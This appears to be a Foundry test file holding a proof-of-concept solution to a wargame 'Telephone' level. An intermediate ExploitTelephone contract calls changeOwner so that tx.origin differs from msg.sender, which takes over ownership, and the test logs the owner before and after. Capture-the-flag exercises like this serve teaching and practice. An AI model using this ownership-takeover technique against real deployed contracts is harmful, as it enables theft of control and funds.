// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/level4.sol";

contract POC is Test {
    Telephone level4 = new Telephone();
    ExploitTelephone attacker = new ExploitTelephone(level4);
    address old_owner = level4.owner();

    function test() external {
        vm.startBroadcast();

        attacker.attack(msg.sender);

        console.log("Old owner: ", old_owner);
        console.log("New owner: ", level4.owner());
        console.log("Attacker: ", msg.sender);

        vm.stopBroadcast();
    }
}

contract ExploitTelephone {
    Telephone telephone;

    constructor(Telephone _telephone) public {
        telephone = Telephone(_telephone);
    }

    function attack(address owner) public {
        telephone.changeOwner(owner);
    }
}
